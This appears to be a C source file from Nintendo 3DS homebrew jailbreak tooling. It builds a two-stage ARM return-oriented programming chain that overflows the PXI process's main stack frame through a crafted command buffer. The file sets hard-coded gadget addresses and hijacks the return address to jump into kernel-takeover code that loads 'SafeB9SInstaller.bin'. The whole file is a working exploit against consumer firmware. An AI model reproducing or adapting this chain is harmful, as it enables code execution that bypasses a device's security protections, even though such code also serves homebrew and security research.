#include <string.h>
#include "pxi11.h"
#include "../../kernelhaxcode_3ds/takeover.h"

static const u32 PXI_MAIN_STACK_FRAME_SIZE = 0x3E*4;
static const u32 PXI_MAIN_SAVED_REG_COUNT = 0x9;
static const u32 PXI_MAIN_STACK_BASE = 0x10000000;
static const u32 PXI_MAIN_STACK_REG_PTR = (PXI_MAIN_STACK_BASE-PXI_MAIN_SAVED_REG_COUNT*4);

static const u32 GADGET4 = 0x102C74;
/*
  bl PXIReceiveBuffer
  mov r0, r7
  movs r1, r0, lsr#31
  bne ...             -> add sp, sp, #0x18; pop {r4-r10, pc}
*/
static const u32 GADGET4_NEXT_GADGET_OFFSET = (0x18 + 0x1C);
static const u32 STAGE1_MAX_SIZE = (0xFC - GADGET4_NEXT_GADGET_OFFSET);
static const u32 STAGE1_BASE = PXI_MAIN_STACK_BASE - STAGE1_MAX_SIZE;

static const u32 GADGET3 = 0x1031A4;
/*
  ldrd r0, r1, [r4, #8]
  ldr r2, [r4, #4]
  blx r2
*/

static const u32 GADGET2 = 0x102E74;
/*
  sub sp, sp, r3
  mov r1, sp
  str r3, [sp, #-4]!
  blx r2
*/

static const u32 GADGET1 = 0x102480;
/*
  ldrb r0, [r4, #8]
  ldr r12, [r4, #0xC]!
  ldr r1, =...
  add r0, r0, #6
  and r3, r0, #0xFF
  ldr r0, [r4, #4]
  mov r2, r5
  blx r12
*/

static const u32 POP_R3R4R5PC = 0x1002C8;
static const u32 POP_R4PC = 0x100104;
static const u32 POP_R4R5PC = 0x103018;
static const u32 POP_R4R5R6R7PC = 0x101D68;
static const u32 MOV_R1R7_BLX_R2 = 0x102174;
static const u32 MOV_R0R4_POP_R4PC = 0x100100;
static const u32 GADGET5 = 0x1017F0;
/*
  ldr r12, [r1, #0xC]
  cmp r12, #0
  beq ...
  mov r3, #0
  str r3, [sp]
  ldr r1, [r1, #0x10]
  mov r3, #1
  add r2, r4, #4
  add r0, sp, #8
  blx r12
*/

static const u32 lowfirmtid = 0xFFFFFFFF;
static const u32 highfirmtid = 0x00000000;
static const u32 fileoffset = 0;
static const char filename[] = "SafeB9SInstaller.bin";
static const u32 stage1[] = {
  [0]   = POP_R4R5R6R7PC,
  [1]   = STAGE1_BASE+3*4,  //R4, points to stage1[3], will load gadget from stage1[6]
  [2]   = POP_R4R5PC,       //R5, upcoming gadget
  [3]   = 0xDEADC0DE,       //R6, unused
  [4]   = STAGE1_BASE+8*4,  //R7, points to stage1[8], eventually moved to r1
                            //    pointer to load args for khc, see gadget5

  [5]   = GADGET1,          //PC, for r2 <- POP_R4PC    ('mov r2, r5')

  [6]   = MOV_R1R7_BLX_R2,  //exec after gadget 1, r1 <-  (high tid)
                            //then pop {r4, r5, pc} ('blx r2') to load gadget at stage1[8]
  [7]   = 0xDEADC0DE,       //unused

  [8]   = POP_R4PC,
  [9]   = STAGE1_BASE+21*4, //to set r2 ~> filename later
                    //(used for 'add r2, r4, #4' (gadget5))
                    //points to stage1[21], r2 will point to stage1[22]

  [10]  = GADGET5,          //to load r1, set r2
  [11]  = POP_R4R5PC,       //R12, to load next gadget
  [12]  = highfirmtid,      //R1, khc high firm tid

  [13]  = POP_R4PC,
  [14]  = lowfirmtid,       //R4, moved into r0
  [15]  = MOV_R0R4_POP_R4PC,//r0 <- low firmtid (khc low firmtid arg)
  [16]  = 0xDEADC0DE,

  [17]  = POP_R3R4R5PC,     //to set r3 (payload offset for khc)
  [18]  = fileoffset,       //R3, khc payload offset
  [19]  = 0xDEADC0DE,
  [20]  = 0xDEADC0DE,

  [21]  = KHC3DS_MAP_ADDR+0x80000,
  // final jump to khc with args:
  // r0  = firmtid      (firmtid)
  // r1  = &stage1[22]  (filename)
  // r2  = fileoffset   (offset)

  //filename should be copied here, right at the end of the ropchain
};
static const u32 final_stage1_size = sizeof(stage1) + ((sizeof(filename) + sizeof(u32) - 1) & ~(sizeof(u32) - 1));

u32 setupPxi11Stage1RopBuffer(u32* buffer) {
  _Static_assert(final_stage1_size <= STAGE1_MAX_SIZE, "Stage 1 is too big");
  memcpy(buffer, stage1, sizeof(stage1));
  strcpy((char*)&buffer[sizeof(stage1)/sizeof(u32)], filename);

  return final_stage1_size / sizeof(u32);
}

inline u32 stage1MaxSize(void) {
  return STAGE1_MAX_SIZE;
}

u32 setupPxi11Stage0RopCmdBuf(u32* cmdbuf) {
  const u32 size = PXI_MAIN_STACK_FRAME_SIZE/4; //size in words
  cmdbuf[0] = 0x10000 | (size-1);   //response header
  cmdbuf[1] = 0;                    //no error, probably useless but anyway
  for(int i = 2; i < size - PXI_MAIN_SAVED_REG_COUNT; i++)
    cmdbuf[i] = 0x00028004;         //handle to terminationEvent, easy to guess
                                    //this is needed because for some reason
                                    //WaitSynchronizationN waits even if it gets
                                    //passed invalid handles, and since we're
                                    //overwriting the whole stack frame...

  //this will be copied at PXI_MAIN_STACK_REG_PTR
  //R4, initially points to R5 on stack and R8 after gadget 1, used to load values
  cmdbuf[size-9] = PXI_MAIN_STACK_REG_PTR + 4;
  //R5, 3rd gadget, load arguments and jump to PXIReceiveBuffer
  cmdbuf[size-8] = GADGET3;
  //R6, unused
  cmdbuf[size-7] = 0xDEADC0DE;
  //R7, byte 1: size for 'add r0, r0, #6; and r3, r0, #0xFF' ... 'sub sp, sp, r3'
  //    bit31: set for taking branch in gadget4
  cmdbuf[size-6] = (1<<31) | ((STAGE1_MAX_SIZE + GADGET4_NEXT_GADGET_OFFSET - 4 - 6) & 0xFF);
  //R8, 2nd gadget, give space on stack for stage1
  cmdbuf[size-5] = GADGET2;
  //R9, 4th gadget, call PXIReceiveBuffer and eventually pop
  cmdbuf[size-4] = GADGET4;
  //R10, buffer for stage1
  cmdbuf[size-3] = STAGE1_BASE;
  //R11, size in words of stage 1
  cmdbuf[size-2] = final_stage1_size / sizeof(u32);
  //LR, 1st gadget, return address of main() in PXI
  cmdbuf[size-1] = GADGET1;

  return size;
}
